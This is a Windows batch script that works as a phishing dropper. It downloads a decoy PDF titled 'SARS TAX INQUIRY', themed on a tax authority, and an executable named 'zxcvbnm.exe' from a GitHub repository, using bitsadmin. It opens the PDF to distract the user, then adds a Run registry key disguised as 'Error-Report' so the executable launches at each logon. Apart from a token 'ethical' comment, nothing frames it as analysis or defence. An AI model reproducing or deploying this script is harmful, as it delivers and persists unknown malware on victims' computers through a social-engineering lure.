@echo off
:: Define URLs and target paths
set pdf_url=https://raw.githubusercontent.com/gituser2244/serve_it/main/SARS TAX INQUIRY.pdf
set exe_url=https://raw.githubusercontent.com/gituser2244/serve_it/main/zxcvbnm.exe
set pdf_path=C:\ProgramData\SARS TAX INQUIRY.pdf
set exe_path=C:\ProgramData\zxcvbnm.exe

:: Download PDF file
echo Downloading PDF file...
bitsadmin /transfer "DownloadPDF" /download /priority normal "%pdf_url%" "%pdf_path%"

:: Download EXE file
echo Downloading EXE file...
bitsadmin /transfer "DownloadEXE" /download /priority normal "%exe_url%" "%exe_path%"

:: Check if files exist
if exist "%pdf_path%" (
    echo PDF downloaded successfully.
) else (
    echo Failed to download PDF. Exiting.
    exit /b
)

if exist "%exe_path%" (
    echo EXE downloaded successfully.
) else (
    echo Failed to download EXE. Exiting.
    exit /b
)

:: Open the PDF file
echo Opening the PDF file...
start "" "%pdf_path%"

:: Add a registry key to run the EXE on user logon (only if necessary and ethical)
echo Adding registry key to run EXE on logon...
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Error-Report" /t REG_SZ /d "C:\ProgramData\zxcvbnm.exe" /f


echo Script completed.

exit